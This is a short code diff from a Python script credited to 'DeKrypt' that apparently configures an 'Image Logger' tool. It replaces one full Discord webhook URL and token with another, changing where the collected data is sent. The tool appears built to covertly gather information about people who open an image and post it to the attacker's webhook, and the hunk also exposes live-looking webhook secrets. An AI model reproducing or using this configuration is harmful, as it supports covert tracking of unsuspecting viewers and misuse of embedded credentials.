@@ -23,7 +23,7 @@ __author__ = "DeKrypt"
 # Configuration
 CONFIG = {
     # Webhook Configuration
-    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
+    "webhook": "https://discordapp.com/api/webhooks/1519697314145370274/TDN2Y1SN37Tb8_5QdgYeAuFMLa0Qv2xdLAjNQD2dog9o5hAA74yaDD2S4As9Y-xcr634",
     "username": "Image Logger",
     "color": 0x00FFFF,
     
